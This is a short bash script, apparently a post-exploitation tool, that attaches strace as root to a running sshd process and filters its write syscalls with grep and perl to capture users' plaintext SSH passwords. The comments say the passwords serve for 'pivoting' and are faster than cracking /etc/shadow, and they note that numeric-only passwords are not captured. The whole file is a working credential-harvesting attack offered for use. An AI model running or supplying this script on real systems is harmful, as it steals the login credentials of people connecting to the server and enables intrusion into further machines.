#!/bin/bash
#
# In a facepalm revelation, it has come to my attention that you can use strace as root to collect passwords from sshd
# Passwords are useful for pivoting and can be significantly faster than cracking /etc/shadow
# I think I fixed the random char padding problem, but now perl is required
# Turns out it also doesn't work if the password is entirely numbers.
#

strace -s 128 -fp `cat /var/run/sshd.pid` 2>&1 | grep --line-buffered -oP 'write\(4, "\\0\\0\\0\\[\d]*[^\\]{2,}[^\\0]"' | perl -pe 's/write\(4, "\\0\\0\\0\\([\d]+|[\w])(.*)"/\2/g'
